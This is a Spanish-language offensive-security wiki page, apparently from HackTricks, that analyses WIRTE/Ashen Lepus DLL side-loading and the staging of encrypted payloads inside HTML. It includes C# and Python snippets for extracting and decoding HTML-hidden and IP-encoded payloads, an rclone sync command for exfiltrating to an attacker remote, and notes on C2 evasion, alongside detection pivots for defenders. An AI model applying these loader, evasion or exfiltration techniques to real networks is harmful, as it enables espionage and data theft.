# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general del Tradecraft

Ashen Lepus (también conocido como WIRTE) convirtió en arma un patrón reutilizable que encadena DLL sideloading, payloads HTML por etapas y backdoors .NET modulares para mantener la persistencia dentro de redes diplomáticas de Oriente Medio. La técnica puede ser reutilizada por cualquier operador porque se basa en:<sup>[[1]](#references)</sup>

- **Ingeniería social basada en archivos comprimidos**: PDFs benignos indican a los objetivos que descarguen un archivo RAR desde un sitio de file-sharing. El archivo contiene un EXE de visor de documentos con apariencia legítima, una DLL maliciosa con el nombre de una librería confiable (por ejemplo, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) y un `Document.pdf` señuelo.
- **Abuso del orden de búsqueda de DLL**: la víctima hace doble clic en el EXE, Windows resuelve la importación de la DLL desde el directorio actual y el loader malicioso (AshenLoader) se ejecuta dentro del proceso confiable mientras el PDF señuelo se abre para evitar sospechas.
- **Staging mediante Living-off-the-land**: cada etapa posterior (AshenStager → AshenOrchestrator → módulos) se mantiene fuera del disco hasta que se necesita y se entrega como blobs cifrados ocultos dentro de respuestas HTML aparentemente inofensivas.

## Cadena de Side-Loading por múltiples etapas

1. **EXE señuelo → AshenLoader**: el EXE realiza sideload de AshenLoader, que lleva a cabo reconocimiento del host, lo cifra con AES-CTR y lo envía mediante POST dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` a rutas con apariencia de API (por ejemplo, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extracción de HTML**: el C2 solo revela la siguiente etapa cuando la IP del cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, dificultando el análisis en sandboxes. Cuando las comprobaciones tienen éxito, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload AshenStager cifrado mediante Base64/AES-CTR.
3. **Segundo sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario obtiene más HTML, esta vez extrayendo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador .NET modular que decodifica una configuración JSON en Base64. Los campos `tg` y `au` de la configuración se concatenan y se aplican como hash para generar la clave AES, que descifra `xrk`. Los bytes resultantes actúan como clave XOR para cada blob de módulo obtenido posteriormente.
5. **Entrega de módulos**: cada módulo se describe mediante comentarios HTML que redirigen el parser a un tag arbitrario, evadiendo las reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistencia (`PR*`), uninstallers (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### Patrón de Parsing de Contenedores HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar el tag indicado en el comentario HTML para reanudar la entrega.<sup>[[1]](#references)</sup>

### Ayudante de extracción rápida (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelismos de evasión de HTML Staging

Investigaciones recientes sobre HTML smuggling (Talos) destacan payloads ocultos como cadenas Base64 dentro de bloques `<script>` en archivos adjuntos HTML y decodificados mediante JavaScript durante la ejecución.<sup>[[2]](#references)</sup> El mismo truco puede reutilizarse para respuestas C2: incluir blobs cifrados dentro de una etiqueta script (u otro elemento DOM) y decodificarlos en memoria antes de aplicar AES/XOR, haciendo que la página parezca HTML ordinario. Talos también muestra ofuscación por capas (renombrado de identificadores más Base64/Caesar/AES) dentro de etiquetas script, lo que se adapta perfectamente a blobs C2 almacenados en HTML.<sup>[[2]](#references)</sup> Un análisis posterior de Talos sobre **hidden text salting** también es relevante aquí: dividir Base64 mediante comentarios HTML irrelevantes o espacios en blanco basta para inutilizar extractores regex simples, mientras que la reconstrucción en el navegador sigue siendo trivial.<sup>[[7]](#references)</sup>

## Notas sobre variantes recientes (2024-2025)

- Check Point observó campañas de WIRTE en 2024 que aún dependían de sideloading basado en archivos comprimidos, pero utilizaban `propsys.dll` (stagerx64) como primera etapa. El stager decodifica el siguiente payload con Base64 + XOR (clave `53`), envía solicitudes HTTP con un `User-Agent` hardcodeado y extrae blobs cifrados incrustados entre etiquetas HTML. En una variante, la etapa se reconstruía a partir de una lista extensa de cadenas IP incrustadas, decodificadas mediante `RtlIpv4StringToAddressA` y posteriormente concatenadas para formar los bytes del payload.<sup>[[3]](#references)</sup>
- OWN-CERT documentó herramientas anteriores de WIRTE en las que el dropper `wtsapi32.dll` cargado mediante sideloading protegía las cadenas con Base64 + TEA y utilizaba el propio nombre de la DLL como clave de descifrado; después, ofuscaba mediante XOR/Base64 los datos de identificación del host antes de enviarlos al C2.<sup>[[4]](#references)</sup>

## Reconstrucción de etapas codificadas como IP

La variante de `propsys.dll` de WIRTE de 2024 muestra que el siguiente PE no necesita residir en un único blob HTML contiguo. El loader puede almacenar los bytes de la etapa como cadenas dotted-quad y reconstruirlos mediante `RtlIpv4StringToAddressA`, un patrón estrechamente relacionado con el tradecraft **IPfuscation** de Hive.<sup>[[3]](#references)[[5]](#references)</sup> Desde el punto de vista operativo, esto resulta útil cuando el actor quiere que la página HTML contenga lo que parecen IOCs o datos de configuración inofensivos en lugar de un payload Base64 evidente.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Si los bytes recuperados comienzan con `MZ`, probablemente reconstruiste el siguiente PE directamente. Si no, comprueba si existe una capa inicial XOR/Base64 o pequeños fragmentos delimitadores entre las direcciones.

## Nombres de DLL intercambiables y rotación de hosts

Una propiedad importante de este patrón es que el **backend de staging HTML/AES/XOR puede permanecer idéntico mientras solo cambia el par de sideloading**. WIRTE alternó entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` y `propsys.dll` en distintas campañas, lo cual resulta útil porque:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` y `wtsapi32.dll` son nombres de DLL de Windows comunes que los defensores esperan encontrar en `%System32%` / `%SysWOW64%`.
- Los catálogos públicos, como **HijackLibs**, ya relacionan muchos binarios que cargarán esos nombres de DLL desde un directorio de aplicación copiado, proporcionando a los operadores hosts de reemplazo sin rediseñar el stager.
- Solo es necesario adaptar la superficie de exportación para cada host. El parser HTML, las rutinas AES/XOR y el cargador de módulos normalmente pueden trasplantarse sin cambios a una DLL proxy de forwarding.

Para el trabajo ofensivo en laboratorio, esto significa que puedes separar el problema en **(1) encontrar un host firmado estable que resuelva localmente el nombre de DLL elegido** y **(2) reutilizar la misma lógica del cargador de HTML staged detrás de esa DLL**.

## Hardening de Crypto y C2

- **AES-CTR en todas partes**: los loaders actuales incluyen claves de 256 bits más nonces (por ejemplo, `{9a 20 51 98 ...}`) y, opcionalmente, añaden una capa XOR usando strings como `msasn1.dll` antes o después del descifrado.<sup>[[1]](#references)</sup>
- **Variaciones del material criptográfico**: los loaders anteriores usaban Base64 + TEA para proteger strings embebidos, con la clave de descifrado derivada del nombre de la DLL maliciosa (por ejemplo, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separación de la infraestructura + camuflaje mediante subdominios**: los servidores de staging están separados por herramienta, alojados en distintos ASN y, en ocasiones, precedidos por subdominios de apariencia legítima, de modo que comprometer una stage no expone el resto.
- **Recon smuggling**: los datos enumerados ahora incluyen listados de Program Files para detectar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **Rotación de URI**: los parámetros de consulta y las rutas REST cambian entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), lo que invalida las detecciones frágiles.
- **Fijación de User-Agent + redirects seguros**: la infraestructura C2 solo responde a strings de UA exactos y, de lo contrario, redirige a sitios benignos de noticias o salud para mezclarse con el tráfico normal.
- **Entrega controlada**: los servidores están geo-restringidos y solo responden a implants reales. Los clientes no aprobados reciben HTML inofensivo.

## Persistencia y bucle de ejecución

AshenStager crea scheduled tasks que se hacen pasar por tareas de mantenimiento de Windows y se ejecutan mediante `svchost.exe`, por ejemplo:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas vuelven a iniciar la cadena de sideloading durante el arranque o en intervalos, garantizando que AshenOrchestrator pueda solicitar módulos actualizados sin volver a tocar el disco.

## Uso de clientes de sincronización benignos para la exfiltración

Los operadores preparan documentos diplomáticos dentro de `C:\Users\Public` (legible por todos y no sospechoso) mediante un módulo dedicado; después descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento del atacante. Unit42 señala que esta es la primera vez que se observa a este actor usando Rclone para la exfiltración, en línea con la tendencia general de abusar de herramientas legítimas de sincronización para mezclarse con el tráfico normal:<sup>[[1]](#references)</sup>

1. **Preparar**: copiar o recopilar los archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configurar**: enviar una configuración de Rclone que apunte a un endpoint HTTPS controlado por el atacante (por ejemplo, `api.technology-system[.]com`).
3. **Sincronizar**: ejecutar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se parezca a backups normales en la cloud.

Dado que Rclone se utiliza ampliamente en workflows legítimos de backup, los defensores deben centrarse en ejecuciones anómalas (binarios nuevos, remotes inusuales o sincronizaciones repentinas de `C:\Users\Public`).

## Pivots de detección

- Genera alertas sobre **procesos firmados** que carguen inesperadamente DLLs desde rutas modificables por el usuario (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de las DLL coincidan con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.<sup>[[6]](#references)</sup>
- Inspecciona las respuestas HTTPS sospechosas en busca de **grandes blobs Base64 embebidos en tags inusuales** o protegidos mediante comentarios `<!-- TAG: <xyz> -->`.
- Normaliza primero el HTML: **elimina los comentarios y colapsa los espacios en blanco antes de extraer Base64**, ya que la evasión de tipo hidden-text-salting puede dividir los payloads entre los límites de los comentarios.
- Amplía la búsqueda en HTML a **strings Base64 dentro de bloques `<script>`** (staging de estilo HTML smuggling) que se decodifiquen mediante JavaScript antes del procesamiento AES/XOR.
- Busca llamadas repetidas a **`RtlIpv4StringToAddressA` seguidas del ensamblado de buffers**, especialmente cuando los strings circundantes sean listas largas de IPv4 en lugar de objetivos de red reales.
- Busca **scheduled tasks** que ejecuten `svchost.exe` con argumentos que no sean de servicio o que apunten de vuelta a directorios de droppers.
- Rastrea los **redirects de C2** que solo devuelvan payloads para strings exactos de `User-Agent` y que, de otro modo, redirijan a dominios legítimos de noticias o salud.
- Supervisa la aparición de binarios de **Rclone** fuera de ubicaciones gestionadas por IT, de nuevos archivos `rclone.conf` o de trabajos de sincronización que extraigan datos de directorios de staging como `C:\Users\Public`.

## Referencias

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
